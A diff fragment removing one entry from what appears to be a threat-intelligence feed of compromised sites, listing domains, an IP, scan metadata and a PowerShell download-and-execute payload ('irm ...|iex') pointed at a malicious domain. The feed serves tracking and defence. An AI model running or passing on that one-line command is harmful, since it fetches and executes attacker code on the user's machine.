@@ -6736,31 +6736,5 @@
     ],
     "ReportId": "cmwcaacd0067j0oml4ziu910p",
     "ScannedAt": "2026-11-11T15:38:37.512000+00:00"
-  },
-  {
-    "UrlDomain": "shebhaproduct.com",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [
-      "https://shebhaproduct.com/",
-      "https://i0.wp.com/shebhaproduct.com/wp-content/uploads/2022/02/Logo.png?resize=300%2C3000&ssl=1",
-      "https://shebhaproduct.com/wp-content/uploads/2023/12/368116023_1529811771156522_1973235804511501718_n.jpg"
-    ],
-    "IP": [
-      "66.235.200.145"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/e0f433c5355ab6b9",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/e0f433c5355ab6b9'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/e0f433c5355ab6b9"
-    ],
-    "ReportId": "cmwca5h1o061v0omlwaufjf39",
-    "ScannedAt": "2026-11-11T15:34:50.263000+00:00"
   }
 ]
